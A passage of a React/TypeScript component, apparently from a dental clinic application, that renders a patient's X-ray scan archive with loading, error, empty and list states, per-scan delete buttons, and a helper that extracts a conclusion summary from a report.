										padding: "8px 12px",
										background: "var(--warn-bg)",
										color: "var(--warn-fg)",
										borderRadius: "8px",
										fontSize: "0.82rem",
									}}
								>
									{deleteFailure}
								</div>
							)}
						</div>
					)}

					{/* Архив снимков: загрузка / отказ / пусто / список — четыре разных
              вида вместо прежних двух («список» и «ничего», куда попадал и
              отказ сервера). */}
					{!currentScan && selectedPatientId && historyPhase === "loading" && (
						<div
							style={{
								marginTop: "16px",
								fontSize: "0.85rem",
								color: "var(--muted)",
								display: "flex",
								alignItems: "center",
								gap: "6px",
							}}
						>
							<Loader2 size={13} className="animate-spin" />
							{panelStateText(SCAN_ARCHIVE_SUBJECT, { phase: "loading" }).title}
						</div>
					)}

					{!currentScan &&
						selectedPatientId &&
						historyPhase === "failed" &&
						historyFailure && (
							<div style={{ marginTop: "16px" }}>
								<PanelLoadFailure
									subject={SCAN_ARCHIVE_SUBJECT}
									status={historyFailure.status}
									onRetry={() => loadHistory(selectedPatientId)}
								/>
							</div>
						)}

					{/* Честная пустота. Что делать дальше, уже написано в зоне загрузки
              выше, поэтому подсказка здесь не повторяется — иначе на одном
              экране два раза сказано одно и то же. */}
					{!currentScan && selectedPatientId && historyPhase === "empty" && (
						<div
							style={{
								marginTop: "16px",
								fontSize: "0.82rem",
								color: "var(--muted)",
							}}
						>
							{panelStateText(SCAN_ARCHIVE_SUBJECT, { phase: "empty" }).title}
						</div>
					)}

					{!currentScan && historyPhase === "ready" && (
						<div style={{ marginTop: "16px" }}>
							<button
								type="button"
								onClick={() => setHistoryExpanded(!historyExpanded)}
								style={{
									display: "flex",
									alignItems: "center",
									gap: "6px",
									background: "none",
									border: "none",
									cursor: "pointer",
									fontSize: "0.85rem",
									color: "var(--muted)",
									padding: "4px 0",
									fontWeight: 500,
								}}
							>
								<History size={14} />
								История снимков ({scanHistory.length})
								<ChevronDown
									size={13}
									style={{
										transform: historyExpanded ? "rotate(180deg)" : "none",
										transition: "transform 0.2s",
									}}
								/>
							</button>
							{historyExpanded && (
								<div
									style={{
										marginTop: "8px",
										display: "flex",
										flexDirection: "column",
										gap: "6px",
										maxHeight: "240px",
										overflowY: "auto",
										paddingRight: "4px",
									}}
								>
									{deleteFailure && (
										<div
											role="alert"
											data-testid="xray-scan-delete-failure"
											style={{
												padding: "8px 12px",
												background: "var(--warn-bg)",
												color: "var(--warn-fg)",
												borderRadius: "8px",
												fontSize: "0.82rem",
												display: "flex",
												gap: "8px",
												alignItems: "flex-start",
											}}
										>
											<AlertTriangle
												size={14}
												style={{ flexShrink: 0, marginTop: "2px" }}
												aria-hidden="true"
											/>
											<span>{deleteFailure}</span>
										</div>
									)}
									{(scanHistory ?? []).map((scan) => (
										<div
											key={scan.id}
											data-testid={`xray-scan-history-row-${scan.id}`}
											style={{
												display: "flex",
												alignItems: "stretch",
												gap: "6px",
											}}
										>
											<button
												type="button"
												onClick={() => loadHistoryScan(scan)}
												data-testid={`xray-scan-open-${scan.id}`}
												style={{
													flex: 1,
													display: "flex",
													alignItems: "center",
													gap: "10px",
													padding: "10px 12px",
													borderRadius: "8px",
													border: "1px solid var(--line)",
													background: "var(--paper-soft)",
													cursor: "pointer",
													textAlign: "left",
													transition: "all 0.15s",
													minWidth: 0,
												}}
											>
												<div
													style={{
														width: "36px",
														height: "36px",
														borderRadius: "6px",
														background: "var(--paper)",
														display: "flex",
														alignItems: "center",
														justifyContent: "center",
														border: "1px solid var(--line)",
														flexShrink: 0,
													}}
												>
													<ScanLine
														size={16}
														style={{ color: "var(--teal)" }}
													/>
												</div>
												<div style={{ flex: 1, minWidth: 0 }}>
													<div
														style={{
															fontWeight: 600,
															fontSize: "0.85rem",
															color: "var(--ink)",
														}}
													>
														{scan.originalFilename ?? "Снимок"}
													</div>
													<div
														style={{
															fontSize: "0.78rem",
															color: "var(--muted)",
															marginTop: "2px",
														}}
													>
														{new Date(scan.capturedAt).toLocaleDateString(
															"ru-RU",
														)}{" "}
														·{" "}
														{scan?.aiToothStates
															? Object.keys(scan.aiToothStates).length
															: 0}{" "}
														зубов
														{scan.aiSummary && (
															<span> · {scan.aiSummary.substring(0, 60)}…</span>
														)}
													</div>
												</div>
												<ZoomIn
													size={14}
													style={{ color: "var(--muted)", flexShrink: 0 }}
												/>
											</button>
											<button
												type="button"
												data-testid={`xray-scan-delete-${scan.id}`}
												aria-label={`Удалить снимок ${scan.originalFilename ?? scan.id}`}
												title="Удалить из архива"
												disabled={deletingScanId === scan.id}
												onClick={(e) => {
													e.preventDefault();
													e.stopPropagation();
													void deleteScan(scan);
												}}
												style={{
													width: "40px",
													flexShrink: 0,
													borderRadius: "8px",
													border: "1px solid var(--line)",
													background: "var(--paper)",
													color:
														deletingScanId === scan.id
															? "var(--muted)"
															: "var(--rust, #c62828)",
													cursor:
														deletingScanId === scan.id ? "wait" : "pointer",
													display: "flex",
													alignItems: "center",
													justifyContent: "center",
												}}
											>
												{deletingScanId === scan.id ? (
													<Loader2
														size={14}
														className="animate-spin"
														aria-hidden="true"
													/>
												) : (
													<Trash2 size={14} aria-hidden="true" />
												)}
											</button>
										</div>
									))}
								</div>
							)}
						</div>
					)}
				</div>
			</div>
		</details>
	);
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

const STATE_LABELS: Record<string, string> = {
	treatment: "лечение",
	planned: "план",
	watch: "наблюд.",
	done: "вылечен",
	missing: "отсутст.",
};

function extractSummary(report: string): string | null {
	if (!report) return null;
	const conclusionMatch = report.match(
		/\*\*Заключение:\*\*\s*\n([\s\S]*?)(?:\n\n|\*\*|$)/i,
	);
	if (conclusionMatch?.[1]) {
		return conclusionMatch[1]
			.replace(/^[-*\s]+/gm, "")
			.trim()
			.substring(0, 400);
	}
	return report.replace(/[*#`]/g, "").substring(0, 200).trim() || null;
}
